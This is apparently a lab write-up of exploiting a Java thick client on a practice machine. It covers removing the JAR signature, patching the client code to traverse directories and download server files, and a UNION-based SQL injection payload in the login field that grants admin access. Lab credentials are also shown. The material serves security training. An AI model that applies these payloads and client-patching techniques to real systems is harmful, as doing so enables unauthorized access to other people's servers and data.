
### **Scenario Overview**

- Discovered files via anonymous FTP:
    - _fatty-client.jar_
    - _note.stxt, note2.txt, note3.txt_

- Key info:
    
    - Server runs on port _1337_ (previously 8000)
    - App uses _Java 8_
    - Credentials: `qtc / clarabibi`

---

### **Initial Configuration Fixes**

- App fails with _Connection Error!_ on login due to incorrect port.
- _Wireshark_ confirms connection attempt to `server.fatty.htb` on port 8000.
- Fix: Add entry to `hosts` file:
```txt
10.10.10.174    server.fatty.htb
```
- Extracted JAR file reveals port 8000 hardcoded in `beans.xml`.
- Also discovered: secret value `clarabibiclarabibiclarabibi`.


---

### **JAR Signature Bypass**

- Modifying JAR fails due to SHA-256 mismatch in `MANIFEST.MF`.
- Fix:
    - Remove hash entries in `MANIFEST.MF`
    - Delete `1.SF`, `1.RSA` from `META-INF`
    - Rebuild JAR:
```bash
jar -cmf META-INF/MANIFEST.MF ../fatty-client-new.jar *
```

---

### **Access via Client GUI**

- Successful login as user `qtc`.
- _Profile → Whoami_ confirms user role is _user_.
- Some features (e.g., _ServerStatus_) restricted to admins.
- Notes reveal:
    - _security.txt_: Critical issues remain unfixed.
    - _dave.txt_: Admin users removed from DB; SQLi mitigation via timeouts.


---

### **Path Traversal Vulnerability**

- File browser allows folder selection and file viewing.
- Attempted payload `../../../../etc/passwd` fails due to `/` filter.
- Decompiled code shows:
    - Folder name is passed via:
```java
invoker.showFiles("configs");
```
- Modified to:
```java
invoker.showFiles("..");
```
- Recompiled class files and rebuilt JAR:
```bash
javac -cp fatty-client-new.jar .../ClientGuiTest.java
jar -cmf META-INF/MANIFEST.MF traverse.jar .
```

- Successful access to upper directories:
	- Found _fatty-server.jar_, _start.sh_
	- _start.sh_: Shows server is running in Alpine Docker container

---

### **File Download via Open Function**

- Modified `Invoker.java` to download selected files:
```java
FileOutputStream fos = new FileOutputStream(desktopPath);
fos.write(response.getContent());
```
- Rebuilt and downloaded _fatty-server.jar_

---

### **SQL Injection in Login Function**

#### **Server-Side Logic**

- Found in: `FattyDbSession.class → checkLogin()`
- Executes:
```java
SELECT id,username,email,password,role FROM users WHERE username='...'
```
- No sanitization of `username`
- Password compared using:
```java
sha256(username + password + "clarabibimakeseverythingsecure")
```

#### **SQLi Discovery**

- Injected `qtc'` → triggers SQL syntax error
- Error logs found in `../logs/error-log.txt` via path traversal
- Confirmed SQLi vulnerability

---

### **Bypassing Login via SQL Injection**

#### **Normal Authentication Logic**

- New user object created from first record in query result
- Password from DB is hashed:
```java
sha256("qtc" + "clarabibi" + "clarabibimakeseverythingsecure")
```
- Client sends:
```java
sha256(username + password + fixed_salt)
```

#### **SQLi Exploit via UNION Injection**

- Used payload in `username` field:
```sql
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```
- Set plaintext password to `abc`
- Modified `User.java` to disable password hashing
- Final SQL executed by server:
```sql
SELECT id,username,email,password,role FROM users WHERE username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
```
- Server compares password and allows login as **admin**


---

### **Key Takeaways**

- Thick clients using 3-tier architecture still vulnerable to _web-specific attacks_
- _JAR signature validation_ can be bypassed to edit client behavior
- _Path Traversal_ enabled enumeration and file download
- _SQL Injection_ vulnerability allowed _admin-level access_
- _Reverse engineering_ + _static/dynamic analysis_ of JAR enabled full exploitation path